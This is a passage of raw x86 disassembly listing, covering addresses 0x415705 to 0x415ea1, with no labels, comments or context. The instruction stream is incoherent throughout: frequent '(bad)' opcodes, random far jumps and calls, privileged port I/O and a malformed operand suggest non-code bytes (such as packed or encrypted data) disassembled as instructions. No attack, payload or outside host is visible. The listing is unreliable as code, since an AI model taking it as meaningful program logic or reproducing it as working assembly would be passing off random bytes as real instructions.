  415705:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415706:	push   eax
  415707:	std    
  415708:	adc    DWORD PTR [ebx-0xd],0xffffffd0
  41570c:	push   esp
  41570d:	fistp  WORD PTR [ebp-0x69]
  415710:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415711:	inc    edi
  415712:	pmovmskb eax,mm0
  415715:	mov    al,0xcd
  415717:	loope  0x4156fd
  415719:	sahf   
  41571a:	(bad)  
  41571b:	mov    esi,0xf8195d86
  415720:	sub    esi,edi
  415722:	xchg   edx,eax
  415723:	ss in  eax,0xa
  415726:	int    0x54
  415728:	ja     0x4156c2
  41572a:	jge    0x4156bd
  41572c:	ficom  WORD PTR [edi+0x2f]
  41572f:	push   es
  415730:	into   
  415731:	cmp    ebx,DWORD PTR [edi+0x2229eb2]
  415737:	imul   edx,DWORD PTR [edx-0x1],0x3999d4d0
  41573e:	add    BYTE PTR [edi+0x6d],0xf9
  415742:	push   ebx
  415743:	ss and ecx,ebx
  415746:	sub    al,0xb5
  415748:	ss dec ebp
  41574a:	dec    edx
  41574b:	data16 and al,BYTE PTR [eax-0x7e]
  41574f:	mov    bl,0x75
  415751:	jo     0x415709
  415753:	xchg   esp,eax
  415754:	push   edx
  415755:	add    eax,0x6a833bd0
  41575a:	add    dh,BYTE PTR [eax-0x1b]
  41575d:	inc    eax
  41575e:	pop    ebp
  41575f:	ins    BYTE PTR es:[edi],dx
  415760:	shr    cl,0x47
  415763:	mov    dl,0x3b
  415765:	ins    DWORD PTR es:[edi],dx
  415766:	or     al,0x97
  415768:	ret    0xdf99
  41576b:	clc    
  41576c:	xchg   edx,eax
  41576d:	dec    edx
  41576e:	jnp    0x4157b0
  415770:	mov    es,WORD PTR [esi]
  415772:	mov    ecx,0xe32950de
  415777:	push   ebx
  415778:	es lock scas eax,DWORD PTR es:[edi]
  41577b:	sbb    eax,0x7489df80
  415780:	inc    ebp
  415781:	push   eax
  415782:	iret   
  415783:	ins    BYTE PTR es:[edi],dx
  415784:	mov    WORD PTR [eax],ss
  415786:	div    BYTE PTR [ebp+esi*2-0x5c]
  41578a:	frstor [esi+ebp*4-0x25f3ac05]
  415791:	sar    edi,cl
  415793:	les    edx,FWORD PTR [edi+0x7b]
  415796:	retf   
  415797:	xchg   esi,eax
  415798:	aaa    
  415799:	xor    ebx,ebx
  41579b:	shl    DWORD PTR [eax],1
  41579d:	jno    0x41579c
  41579f:	mov    edx,0xe3e7a210
  4157a4:	jnp    0x4157a9
  4157a6:	test   DWORD PTR [esi],ecx
  4157a8:	xchg   BYTE PTR [ecx+0x37],cl
  4157ab:	popf   
  4157ac:	das    
  4157ad:	ret    
  4157ae:	call   0xdba9f96f
  4157b3:	mov    bh,0xbd
  4157b5:	pop    ss
  4157b6:	sub    al,0x7c
  4157b8:	push   0xffffffdf
  4157ba:	or     dl,BYTE PTR [esi+0x22]
  4157bd:	xchg   ecx,eax
  4157be:	jcxz   0x4157d4
  4157c1:	int3   
  4157c2:	test   eax,0xec249893
  4157c7:	nop
  4157c8:	pusha  
  4157c9:	out    dx,al
  4157ca:	ins    DWORD PTR es:[edi],dx
  4157cb:	jae    0x415831
  4157cd:	aas    
  4157ce:	sub    al,0x22
  4157d0:	add    eax,0x635b87d7
  4157d5:	or     BYTE PTR [esi-0x5985b1f1],dh
  4157db:	fs mov dh,0xbe
  4157de:	scas   al,BYTE PTR es:[edi]
  4157df:	sbb    eax,0x1cab7b7e
  4157e4:	push   edi
  4157e5:	push   cs
  4157e6:	fistp  QWORD PTR [ebp+0x1f]
  4157e9:	dec    esi
  4157ea:	push   ds
  4157eb:	fld    QWORD PTR [edi+0x36]
  4157ee:	pop    ebp
  4157ef:	shl    DWORD PTR [esi-0x2dfabfe5],0x1f
  4157f6:	jb     0x415781
  4157f8:	and    DWORD PTR [edx-0x63],esp
  4157fb:	xor    esp,DWORD PTR [ebp+0x1735ebc9]
  415801:	outs   dx,BYTE PTR ds:[esi]
  415802:	div    DWORD PTR [edi-0x47]
  415805:	add    BYTE PTR [ebx+ecx*8],bl
  415808:	xchg   esp,eax
  415809:	push   ebx
  41580a:	clc    
  41580b:	and    BYTE PTR [ebx+0x49],bh
  41580e:	jo     0x4157cf
  415810:	push   edi
  415811:	mov    al,0x1a
  415813:	sbb    DWORD PTR [esi-0x5784f93f],0x3f
  41581a:	xchg   ecx,eax
  41581b:	daa    
  41581c:	cs stos DWORD PTR es:[edi],eax
  41581e:	adc    ebp,DWORD PTR [esi-0x78fd0288]
  415824:	xor    DWORD PTR [ecx-0x13],ebx
  415827:	mov    DWORD PTR [esp+edi*2+0x4a8a74a2],ecx
  41582e:	dec    edx
  41582f:	stos   BYTE PTR es:[edi],al
  415830:	aaa    
  415831:	leave  
  415832:	mov    esi,0xdaa660a9
  415837:	pop    esi
  415838:	lahf   
  415839:	aam    0x1c
  41583b:	and    esp,DWORD PTR [edx]
  41583d:	aam    0x6e
  41583f:	test   BYTE PTR [eax-0x2a58301e],ah
  415845:	or     esp,DWORD PTR [ebx+0x4bbdfcfd]
  41584b:	jmp    0x415855
  41584d:	lahf   
  41584e:	iret   
  41584f:	xchg   ecx,eax
  415850:	int3   
  415851:	inc    esi
  415852:	and    DWORD PTR [ebx+0x1e],edx
  415855:	mov    ah,0x73
  415857:	sar    BYTE PTR [ebx+0x42741db5],1
  41585d:	inc    ecx
  41585e:	inc    ecx
  41585f:	stos   BYTE PTR es:[edi],al
  415860:	popa   
  415861:	fwait
  415862:	hlt    
  415863:	mov    esi,0xbf9784a1
  415868:	xchg   ebp,eax
  415869:	mov    ebx,0xabb0ffae
  41586f:	fwait
  415870:	data16 adc al,0x6b
  415873:	mov    bl,0xf8
  415875:	and    dl,BYTE PTR [esi+edi*4-0x50]
  415879:	xlat   BYTE PTR ds:[ebx]
  41587a:	fisub  WORD PTR [edi-0x5f7a5359]
  415880:	jmp    0x4158b4
  415882:	in     eax,dx
  415883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415884:	jmp    0x1890:0x89b23abd
  41588b:	jg     0x415904
  41588d:	xor    eax,0x526560ef
  415892:	mov    al,cl
  415894:	ret    0x2ca8
  415897:	cld    
  415898:	fnsave [eax-0x4ec4d002]
  41589e:	xlat   BYTE PTR ds:[ebx]
  41589f:	fsub   st(4),st
  4158a1:	mov    ebx,esi
  4158a3:	ret    0x6c35
  4158a6:	sub    edi,DWORD PTR [ebx+0xd0cb682]
  4158ac:	in     al,0x34
  4158ae:	xor    al,0x46
  4158b0:	cwde   
  4158b1:	pop    ecx
  4158b2:	pop    edi
  4158b3:	or     bh,al
  4158b5:	jmp    0xde33:0x33460fd8
  4158bc:	push   ds
  4158bd:	adc    bl,BYTE PTR ds:0x47bda724
  4158c3:	inc    edx
  4158c4:	adc    al,0xc0
  4158c6:	sar    DWORD PTR [ebp+0x628bb26b],1
  4158cc:	popf   
  4158cd:	jno    0x4158b0
  4158cf:	mov    esi,0x2b1a185
  4158d4:	test   al,0x58
  4158d6:	or     ebp,DWORD PTR [edx-0x6e]
  4158d9:	xchg   esp,eax
  4158da:	aas    
  4158db:	push   ds
  4158dc:	xchg   esi,eax
  4158dd:	cli    
  4158de:	bound  edx,QWORD PTR [edx-0x72]
  4158e1:	jle    0x4158b9
  4158e3:	cmp    edi,DWORD PTR [ecx]
  4158e5:	cmc    
  4158e6:	jg     0x4158b3
  4158e8:	and    ah,BYTE PTR [edx]
  4158ea:	xor    BYTE PTR [edi],dh
  4158ec:	xchg   DWORD PTR ds:0xffdbdaed,esp
  4158f2:	jp     0x41590d
  4158f4:	add    al,0x5
  4158f6:	dec    esi
  4158f7:	pop    ecx
  4158f8:	scas   al,BYTE PTR es:[edi]
  4158f9:	push   ebp
  4158fa:	add    edx,DWORD PTR [ebx+0x4b]
  4158fd:	ins    DWORD PTR es:[edi],dx
  4158fe:	mov    bh,0x93
  415900:	xchg   DWORD PTR [eax+0x1eb5e5f2],esp
  415906:	or     eax,0x9309d87a
  41590b:	add    ebx,DWORD PTR [edi-0x300fffae]
  415911:	add    ch,BYTE PTR [ebx]
  415913:	mov    eax,ds:0x487cd778
  415918:	mov    al,ds:0xc5e5bf46
  41591d:	je     0x41590e
  41591f:	cmc    
  415920:	xor    al,BYTE PTR [esi]
  415922:	mov    esi,0x8c40409
  415927:	test   eax,0x85430338
  41592c:	shl    edi,1
  41592e:	pop    ebp
  41592f:	enter  0x6f9f,0x11
  415933:	push   0x4efcf6a1
  415938:	xchg   edx,eax
  415939:	popf   
  41593a:	adc    dl,BYTE PTR [eax]
  41593c:	mov    ah,0xe
  41593e:	lods   eax,DWORD PTR ds:[esi]
  41593f:	mov    al,0xc4
  415941:	(bad)  
  415942:	xor    edx,esp
  415944:	les    ebp,FWORD PTR [esi]
  415946:	adc    BYTE PTR [edi],bl
  415948:	inc    eax
  415949:	lods   al,BYTE PTR ds:[esi]
  41594a:	or     BYTE PTR [ebp+0x20],cl
  41594d:	ins    BYTE PTR es:[edi],dx
  41594e:	fimul  WORD PTR [ecx+edi*8-0x1a]
  415952:	xchg   esp,eax
  415953:	ror    BYTE PTR [ecx],1
  415955:	aaa    
  415956:	aam    0x32
  415958:	mov    dl,0x2a
  41595a:	lds    eax,FWORD PTR [ebx]
  41595c:	test   al,0x39
  41595e:	pop    es
  41595f:	(bad)  
  415960:	mov    DWORD PTR [edx+0x44],edi
  415963:	xor    al,0x60
  415965:	dec    ebp
  415966:	inc    ebx
  415967:	mov    esp,0x9a2fec39
  41596c:	inc    esi
  41596d:	ds push ebx
  41596f:	int    0x64
  415971:	jo     0x415995
  415973:	inc    ebx
  415974:	(bad)  
  415975:	and    edi,DWORD PTR [ecx-0xf]
  415978:	mov    bh,0x47
  41597a:	jle    0x4159b5
  41597c:	popf   
  41597d:	pop    esi
  41597e:	sub    DWORD PTR [ebx],edx
  415980:	adc    al,0x99
  415982:	pushf  
  415983:	push   ecx
  415984:	xchg   edx,eax
  415985:	aam    0x2e
  415987:	stos   BYTE PTR es:[edi],al
  415988:	jae    0x4159f0
  41598a:	jge    0x4159db
  41598c:	mov    ah,0xf2
  41598e:	fs inc ebx
  415990:	je     0x41599c
  415992:	add    DWORD PTR [esi],eax
  415994:	sar    DWORD PTR [eax],0x7d
  415997:	fstp   TBYTE PTR [ebx+0x6d782bbc]
  41599d:	std    
  41599e:	lahf   
  41599f:	inc    ecx
  4159a0:	inc    ebp
  4159a1:	push   ebp
  4159a2:	mov    al,0x49
  4159a4:	gs sub al,0xcf
  4159a7:	paddq  mm4,QWORD PTR [edx-0x40]
  4159ab:	pop    edi
  4159ac:	xor    ebx,ecx
  4159ae:	sbb    DWORD PTR [ebx],ecx
  4159b0:	call   0x109c7a81
  4159b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159b6:	dec    ecx
  4159b7:	push   edx
  4159b8:	and    esi,esp
  4159ba:	ds stos DWORD PTR es:[edi],eax
  4159bc:	fsub   QWORD PTR [ebx+0x53]
  4159bf:	mov    DWORD PTR [bx+si+0x511c],0xd652d87
  4159c8:	pop    ebp
  4159c9:	idiv   bh
  4159cb:	xlat   BYTE PTR gs:[ebx]
  4159cd:	pop    ebp
  4159ce:	fisubr DWORD PTR [eax+0x36da487c]
  4159d4:	addr16 xchg dh,cl
  4159d7:	add    dl,bl
  4159d9:	dec    edx
  4159da:	mov    bl,0x47
  4159dc:	add    dl,al
  4159de:	jp     0x415a29
  4159e0:	push   esi
  4159e1:	pop    esp
  4159e2:	jne    0x4159cb
  4159e4:	rcr    BYTE PTR [ebp-0x50],0xc2
  4159e8:	jg     0x415a67
  4159ea:	pusha  
  4159eb:	and    esp,DWORD PTR [ebp+0x44]
  4159ee:	aam    0xd2
  4159f0:	push   0xbac61c49
  4159f5:	lods   al,BYTE PTR ds:[esi]
  4159f6:	lahf   
  4159f7:	or     ebx,DWORD PTR [edx+edi*8-0x1b]
  4159fb:	mov    BYTE PTR [eax+esi*4],al
  4159fe:	inc    eax
  4159ff:	fist   DWORD PTR [eax+0x18f77020]
  415a05:	aaa    
  415a06:	push   eax
  415a07:	mov    ecx,0xa573463a
  415a0c:	adc    DWORD PTR [ebp-0x6a],ecx
  415a0f:	sqrtps xmm5,XMMWORD PTR [ecx+ebp*4]
  415a13:	dec    esp
  415a14:	out    dx,al
  415a15:	inc    ebx
  415a16:	dec    ebx
  415a17:	es and bh,BYTE PTR gs:[ebx+0x25]
  415a1c:	fld1   
  415a1e:	and    al,0x9b
  415a20:	out    dx,eax
  415a21:	test   eax,0x6006d781
  415a26:	in     eax,0x34
  415a28:	or     ebp,edi
  415a2a:	lods   al,BYTE PTR ds:[esi]
  415a2b:	jns    0x4159d6
  415a2d:	xor    al,0xfb
  415a2f:	sub    ebx,DWORD PTR [edi+0x3f]
  415a32:	mov    DWORD PTR ds:0xf5747eb7,edi
  415a38:	adc    DWORD PTR [ebp-0x77],ebp
  415a3b:	mov    bh,0x78
  415a3d:	pop    ds
  415a3e:	and    cl,BYTE PTR [esp+ebp*4+0x5e]
  415a42:	push   0x5
  415a44:	call   DWORD PTR [esp+esi*4+0x56]
  415a48:	in     eax,dx
  415a49:	inc    esi
  415a4a:	repnz add edx,ebx
  415a4d:	outs   dx,BYTE PTR ds:[esi]
  415a4e:	sahf   
  415a4f:	jmp    0x6144:0xa6c4a3b5
  415a56:	adc    DWORD PTR [esi+eiz*1+0x1342474c],esp
  415a5d:	mov    eax,ds:0xecd02e09
  415a62:	inc    esi
  415a63:	mov    eax,ds:0xdc3fab1d
  415a68:	stc    
  415a69:	xchg   ecx,edx
  415a6b:	sub    al,0xbf
  415a6d:	gs mov esi,0x6b8955f9
  415a73:	inc    ebp
  415a74:	mov    ah,0x75
  415a76:	dec    ebx
  415a77:	push   0xaf02f9d2
  415a7c:	sbb    eax,0x745ce93e
  415a81:	adc    al,0x29
  415a83:	inc    edx
  415a84:	push   0xdd22c6da
  415a89:	rcl    BYTE PTR [ebx+0x1c],0x24
  415a8d:	dec    esi
  415a8e:	ds into 
  415a90:	inc    edx
  415a91:	jmp    0x99d8:0xeaf4385
  415a98:	div    DWORD PTR [ebx]
  415a9a:	sbb    ebx,DWORD PTR [eax]
  415a9c:	jo     0x415aa5
  415a9e:	cmp    DWORD PTR [esi-0x7c6383af],ecx
  415aa4:	(bad)  
  415aa5:	jge    0x415a4e
  415aa7:	push   esi
  415aa8:	inc    ebp
  415aa9:	sub    al,0x9b
  415aab:	adc    ebx,DWORD PTR [edi-0x6a]
  415aae:	push   edx
  415aaf:	xchg   edx,eax
  415ab0:	ror    DWORD PTR [eax+0x59],cl
  415ab3:	call   0x1d95:0xf4d9776e
  415aba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415abb:	sahf   
  415abc:	(bad)  
  415abe:	xlat   BYTE PTR ds:[ebx]
  415abf:	es inc edi
  415ac1:	imul   ecx,DWORD PTR [ebx+0x6c],0x5d
  415ac5:	mov    dl,0x3d
  415ac7:	cli    
  415ac8:	inc    esi
  415ac9:	or     edi,DWORD PTR [ebx]
  415acb:	mov    esi,0x1762aaba
  415ad0:	fucomi st,st(4)
  415ad2:	or     BYTE PTR [ecx+0x19e89d54],bl
  415ad8:	stos   DWORD PTR es:[edi],eax
  415ad9:	xchg   ebp,eax
  415ada:	and    eax,0xb640e3dd
  415adf:	or     al,0x55
  415ae1:	test   al,0x40
  415ae3:	dec    ebp
  415ae5:	pop    eax
  415ae6:	mov    al,0x1b
  415ae8:	mov    bh,0x2
  415aea:	shl    esi,1
  415aec:	stos   BYTE PTR es:[edi],al
  415aed:	int    0x99
  415aef:	xchg   edi,eax
  415af0:	in     al,dx
  415af1:	and    al,0x62
  415af3:	(bad)  
  415af4:	nop
  415af5:	inc    esi
  415af6:	fisttp QWORD PTR [edi-0xd]
  415af9:	inc    edx
  415afa:	fsubr  st(2),st
  415afc:	pop    ebx
  415afd:	pushf  
  415afe:	int3   
  415aff:	push   es
  415b00:	std    
  415b01:	xor    BYTE PTR [edx],al
  415b03:	sti    
  415b04:	gs dec edx
  415b06:	dec    ebx
  415b07:	adc    BYTE PTR [edx+0x68],bh
  415b0a:	out    dx,eax
  415b0b:	fild   WORD PTR [eax+0x45e145fb]
  415b11:	sbb    edx,DWORD PTR [ecx-0x86d85ab]
  415b17:	xor    ebp,DWORD PTR ds:0x54b93e80
  415b1d:	or     al,0xdf
  415b1f:	add    edx,ebx
  415b21:	test   DWORD PTR [eax],esi
  415b23:	cdq    
  415b24:	add    BYTE PTR [esi+0x2192f324],bh
  415b2a:	jg     0x415b4e
  415b2c:	repz push bx
  415b2f:	sub    edi,DWORD PTR [edi-0x6f747b5a]
  415b35:	jmp    0x1d12:0x5d6c1686
  415b3c:	cdq    
  415b3d:	lahf   
  415b3e:	xchg   esp,eax
  415b3f:	cmp    eax,0x5ef2eba4
  415b44:	jmp    0xa9cd:0xa563ac6e
  415b4b:	cmp    eax,0x4e173159
  415b50:	loope  0x415bc3
  415b52:	js     0x415ad6
  415b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b55:	(bad)  
  415b56:	cmp    al,0x67
  415b58:	push   esp
  415b59:	lahf   
  415b5a:	shl    DWORD PTR [eax],1
  415b5c:	cmp    al,0x9b
  415b5e:	push   es
  415b5f:	and    DWORD PTR [esi],ecx
  415b61:	lock xor DWORD PTR [edi+0x8],esi
  415b65:	lahf   
  415b66:	popf   
  415b67:	mov    eax,0x63562823
  415b6c:	jmp    FWORD PTR [edi+0x4b]
  415b6f:	sbb    ecx,DWORD PTR [edx]
  415b71:	xor    BYTE PTR [eax+0x304fe6d],bh
  415b77:	scas   al,BYTE PTR es:[edi]
  415b78:	fdiv   DWORD PTR [eax-0x4524a1c4]
  415b7e:	into   
  415b7f:	bound  ebx,QWORD PTR [ebx+0x17e9e898]
  415b85:	rcr    BYTE PTR [ebx+0x65093a6d],1
  415b8b:	paddsb mm2,QWORD PTR [eax-0x61]
  415b8f:	ficom  DWORD PTR [ebx]
  415b91:	sub    al,0xa4
  415b93:	xchg   edx,eax
  415b94:	gs ja  0x415bdd
  415b97:	outs   dx,BYTE PTR ds:[esi]
  415b98:	int3   
  415b99:	loop   0x415be3
  415b9b:	mov    esi,edx
  415b9d:	push   ebx
  415b9e:	mov    ?,WORD PTR [edi]
  415ba0:	in     al,dx
  415ba1:	xchg   ebx,eax
  415ba2:	inc    edi
  415ba3:	push   cs
  415ba4:	inc    esi
  415ba5:	mov    dl,0xb1
  415ba7:	repz jp 0x415c1b
  415baa:	pop    ds
  415bab:	fldcw  WORD PTR [bx+si]
  415bae:	js     0x415b53
  415bb0:	mov    ecx,0x81eedaae
  415bb5:	jne    0x415ba5
  415bb7:	sbb    bl,BYTE PTR [edx]
  415bb9:	pop    ebp
  415bba:	and    eax,0x4bad58db
  415bbf:	jp     0x415b7e
  415bc1:	adc    cl,BYTE PTR [eax-0x2f]
  415bc4:	xchg   edx,eax
  415bc5:	retf   
  415bc6:	pop    edx
  415bc7:	pop    edx
  415bc8:	out    0xc4,al
  415bca:	aam    0xd8
  415bcc:	cmc    
  415bcd:	call   0x831a3948
  415bd2:	inc    ecx
  415bd3:	dec    esi
  415bd4:	mov    cs,WORD PTR [ecx+0xb5e3f7a]
  415bda:	xchg   edi,eax
  415bdb:	or     al,BYTE PTR [edi-0x3f91cd11]
  415be1:	push   ss
  415be2:	push   esi
  415be3:	das    
  415be4:	in     al,0x45
  415be6:	shl    edi,cl
  415be8:	mov    ebx,0xcb52f619
  415bed:	inc    esi
  415bee:	inc    eax
  415bef:	lock dec ebp
  415bf1:	jmp    0xfea2:0xcfc006d4
  415bf8:	loope  0x415c6c
  415bfa:	mov    esp,0x77fe809
  415bff:	lods   eax,DWORD PTR ds:[esi]
  415c00:	pop    ebx
  415c01:	and    eax,edi
  415c03:	add    DWORD PTR [edi],0x851f8502
  415c09:	xor    eax,0x2c25df3a
  415c0e:	sbb    al,0x60
  415c10:	inc    esi
  415c11:	imul   ebp,DWORD PTR [edx+0x355c78a7],0x20
  415c18:	mov    esi,0xedaba0d1
  415c1d:	test   eax,0x2bcf58b9
  415c22:	call   edi
  415c24:	(bad)  
  415c25:	and    esi,ecx
  415c27:	sbb    ch,BYTE PTR [esi+edx*1+0x11]
  415c2b:	out    dx,al
  415c2c:	xlat   BYTE PTR ds:[ebx]
  415c2d:	xchg   edx,eax
  415c2e:	mov    eax,ds:0x516d76e1
  415c33:	lock sbb al,0x31
  415c36:	inc    esp
  415c37:	xor    al,0x7c
  415c39:	cmp    eax,0xbc91c356
  415c3e:	adc    al,0xce
  415c40:	xchg   ebp,eax
  415c41:	add    DWORD PTR [edx-0x7dbc93f9],ebp
  415c47:	imul   eax,DWORD PTR [ebx+edx*1-0x1469abaf],0x7d
  415c4f:	push   ecx
  415c50:	inc    edx
  415c51:	stos   DWORD PTR es:[edi],eax
  415c52:	popf   
  415c53:	and    DWORD PTR [eax-0x22],edi
  415c56:	mov    ds:0x39f7128b,eax
  415c5b:	and    BYTE PTR [esp+ebx*8+0x724d44b],bl
  415c62:	mov    ebp,0xf6a775f8
  415c67:	sbb    al,0xa9
  415c69:	fidiv  DWORD PTR [edx]
  415c6b:	sbb    bl,BYTE PTR [eax+0x26]
  415c6e:	pop    es
  415c6f:	call   0xfb14:0xa76a86ab
  415c76:	out    0xaf,eax
  415c78:	mov    ds:0xd9fdb0a8,eax
  415c7d:	outs   dx,BYTE PTR ds:[esi]
  415c7e:	icebp  
  415c7f:	jo     0x415c1b
  415c81:	xchg   edx,eax
  415c82:	mov    ebx,esi
  415c84:	jmp    0xffb45684
  415c89:	mov    ds,WORD PTR [eax+0x7f2e863f]
  415c8f:	xor    al,BYTE PTR [edx+0x7b6135a0]
  415c95:	sahf   
  415c96:	cwde   
  415c97:	repnz pop edx
  415c99:	(bad)  
  415c9b:	ret    
  415c9c:	loopne 0x415cc8
  415c9e:	call   0xdbec64c3
  415ca3:	xchg   esp,eax
  415ca4:	js     0x415c86
  415ca6:	mov    bl,0x90
  415ca8:	loopne 0x415ccf
  415caa:	or     ebp,ecx
  415cac:	rol    edi,1
  415cae:	adc    BYTE PTR [edi+eax*1+0x34],dh
  415cb2:	mov    DWORD PTR [edx],eax
  415cb4:	fist   WORD PTR [ecx]
  415cb6:	sbb    eax,DWORD PTR [ecx-0x6d]
  415cb9:	inc    edx
  415cba:	popa   
  415cbb:	call   0x2e2894dd
  415cc0:	push   ecx
  415cc1:	or     DWORD PTR [esp+edi*8-0x30],0x4b
  415cc6:	inc    edi
  415cc7:	dec    ecx
  415cc8:	aaa    
  415cc9:	jg     0x415cb3
  415ccb:	pop    ebx
  415ccc:	dec    edx
  415ccd:	jno    0x415c8e
  415ccf:	(bad)  
  415cd1:	lods   eax,DWORD PTR ds:[esi]
  415cd2:	popf   
  415cd3:	das    
  415cd4:	jg     0x415d0a
  415cd6:	inc    eax
  415cd7:	iret   
  415cd8:	cmp    BYTE PTR [edx],bl
  415cda:	pop    eax
  415cdb:	loopne 0x415d3a
  415cdd:	sbb    edi,DWORD PTR [ecx+esi*1]
  415ce0:	lods   al,BYTE PTR ds:[esi]
  415ce1:	not    BYTE PTR [esi+0x41ed8eee]
  415ce7:	or     al,BYTE PTR [esp+esi*4]
  415cea:	xchg   ebx,eax
  415ceb:	add    DWORD PTR [ebp+0x1d],eax
  415cee:	fdecstp 
  415cf0:	cmp    al,0x56
  415cf2:	inc    edx
  415cf3:	add    edi,DWORD PTR [eax+ebx*8]
  415cf6:	jne    0x415cb2
  415cf8:	jnp    0x415c8d
  415cfa:	mov    al,0x67
  415cfc:	inc    edi
  415cfd:	pop    eax
  415cfe:	int3   
  415cff:	sbb    ecx,0xfd8b87cf
  415d05:	inc    edx
  415d06:	in     al,dx
  415d07:	repz jns 0x415d14
  415d0a:	cmp    al,0xa5
  415d0c:	push   0x6
  415d0e:	and    eax,0x48cbd5b
  415d13:	cmp    ch,dl
  415d15:	(bad)  
  415d17:	dec    esi
  415d18:	jecxz  0x415cd8
  415d1a:	ja     0x415cd7
  415d1c:	cld    
  415d1d:	push   0x25
  415d1f:	push   edi
  415d20:	mov    ds:0x19f11cd5,eax
  415d25:	scas   al,BYTE PTR es:[edi]
  415d26:	ret    0xf6b1
  415d29:	(bad)  
  415d2a:	je     0x415cc1
  415d2c:	mov    esi,0x5a42328d
  415d31:	gs lahf 
  415d33:	shl    DWORD PTR [ebp+0xb799b9f],cl
  415d39:	add    dh,BYTE PTR [eax-0x17]
  415d3c:	add    ecx,esi
  415d3e:	sub    BYTE PTR [ebp+0x10],dl
  415d41:	popa   
  415d42:	xchg   DWORD PTR [edx+0x44],edx
  415d45:	adc    DWORD PTR [ebp-0x5],0xffffff9a
  415d49:	into   
  415d4a:	loope  0x415d79
  415d4c:	xlat   BYTE PTR ds:[ebx]
  415d4d:	mov    cl,0x65
  415d4f:	cmp    dl,BYTE PTR [ebx]
  415d51:	jnp    0x415d26
  415d53:	push   esi
  415d54:	inc    ecx
  415d55:	in     eax,0x23
  415d57:	mov    BYTE PTR gs:[ebp+ecx*8+0x14a372bd],dh
  415d5f:	(bad)  
  415d60:	fwait
  415d61:	or     al,0x8d
  415d63:	sub    dl,BYTE PTR [edx+eiz*2]
  415d66:	and    BYTE PTR [edx+ebx*4-0x44],bl
  415d6a:	test   DWORD PTR ss:[edi],0xddd502f4
  415d71:	inc    ecx
  415d72:	mov    ebp,0x1e22c4a3
  415d77:	jge    0x415d25
  415d79:	test   DWORD PTR [ebx+0x55aaf63d],0x42443aa8
  415d83:	addr16 popf 
  415d85:	(bad)  
  415d86:	pop    esi
  415d87:	lods   eax,DWORD PTR ds:[esi]
  415d88:	adc    dh,BYTE PTR [edx+0x75bb5ff3]
  415d8e:	call   0xf863b714
  415d93:	mov    esi,0xed587919
  415d98:	xchg   ecx,eax
  415d99:	or     ebx,0x9c07b84f
  415d9f:	dec    eax
  415da0:	mov    bh,0xf0
  415da2:	ror    ebp,cl
  415da4:	xchg   esp,eax
  415da5:	jg     0x415e1f
  415da7:	push   0xffffffbf
  415da9:	fs xchg ecx,eax
  415dab:	adc    bl,cl
  415dad:	fistp  DWORD PTR [edx-0x74ece81e]
  415db3:	aas    
  415db4:	cmp    eax,0x95252734
  415db9:	ja     0x415d52
  415dbb:	xor    DWORD PTR [esi],0x76cd3347
  415dc1:	mov    al,ds:0x2684b685
  415dc6:	je     0xc48d7d64
  415dcc:	mov    ebp,0x45480e78
  415dd1:	and    al,0xb2
  415dd3:	sub    DWORD PTR [edi+edx*8+0xf787c8d],eax
  415dda:	mov    ecx,0x8975189c
  415ddf:	mov    edx,0xab06d882
  415de4:	adc    DWORD PTR [esi],0xffffffe5
  415de7:	stos   BYTE PTR es:[edi],al
  415de8:	(bad)  
  415de9:	std    
  415dea:	aam    0xd5
  415dec:	pop    eax
  415ded:	sbb    ah,BYTE PTR [eax]
  415def:	scas   al,BYTE PTR es:[edi]
  415df0:	scas   al,BYTE PTR es:[edi]
  415df1:	popf   
  415df2:	jbe    0x415e44
  415df4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415df5:	mov    dl,0x10
  415df7:	sti    
  415df8:	inc    edi
  415df9:	int3   
  415dfa:	ins    BYTE PTR es:[edi],dx
  415dfb:	push   cs
  415dfc:	mov    esi,0xf6a635c2
  415e01:	mov    ds:0x69207cb3,eax
  415e06:	xchg   ebp,eax
  415e07:	(bad)  
  415e08:	nop
  415e09:	mov    bh,0x92
  415e0c:	fwait
  415e0d:	pop    eax
  415e0e:	mov    bh,0xe3
  415e10:	dec    esp
  415e11:	cwde   
  415e12:	retf   
  415e13:	mov    eax,ds:0x104c6073
  415e18:	aas    
  415e19:	pop    esp
  415e1a:	das    
  415e1b:	jecxz  0x415dce
  415e1d:	pop    ebp
  415e1e:	cmp    bl,dh
  415e20:	and    al,bh
  415e22:	test   esi,ebx
  415e24:	das    
  415e25:	xchg   BYTE PTR [ebp+0x5f],ah
  415e28:	pop    eax
  415e29:	xchg   ebx,eax
  415e2a:	enter  0xedfa,0xa3
  415e2e:	repnz (bad) 
  415e30:	test   eax,0x673f9b38
  415e35:	mov    al,0x54
  415e37:	call   0x1109:0xf6e6840e
  415e3e:	cli    
  415e3f:	mov    dh,0x37
  415e41:	inc    eax
  415e42:	in     eax,dx
  415e43:	sub    ebx,DWORD PTR [ecx+0x59229590]
  415e49:	rcl    BYTE PTR [esi+edi*4+0x76],0xc4
  415e4e:	mov    ecx,0xbd7e37a5
  415e53:	and    esi,DWORD PTR [ecx]
  415e55:	adc    al,ch
  415e57:	add    eax,0x4dbedc8b
  415e5c:	fstp   TBYTE PTR [eax+0x637f0a41]
  415e62:	jle    0x415ebf
  415e64:	fistp  WORD PTR [esi+ebp*4-0x2ca601e1]
  415e6b:	pop    ebp
  415e6c:	xchg   bh,dl
  415e6e:	or     ch,ch
  415e70:	std    
  415e71:	fwait
  415e72:	in     al,0xcc
  415e74:	icebp  
  415e75:	or     eax,0x9f7c5f87
  415e7a:	dec    ebp
  415e7b:	pop    eax
  415e7c:	mov    dh,0xe
  415e7e:	int    0xd7
  415e80:	pusha  
  415e81:	rol    BYTE PTR [eax-0x41],cl
  415e84:	imul   eax,DWORD PTR [edx+0x39],0x70
  415e88:	lea    ecx,[edi+0x10]
  415e8b:	mov    DWORD PTR [eax],ebp
  415e8d:	stos   BYTE PTR es:[edi],al
  415e8e:	jae    0x415e1b
  415e90:	mov    dl,0x67
  415e92:	sub    cl,bl
  415e94:	pop    edx
  415e95:	iret   
  415e96:	add    eax,0x6e6043d9
  415e9b:	clc    
  415e9c:	leave  
  415e9d:	and    al,0xaf
  415e9f:	mov    bh,0x2d
  415ea1:	loopne 0x415eba
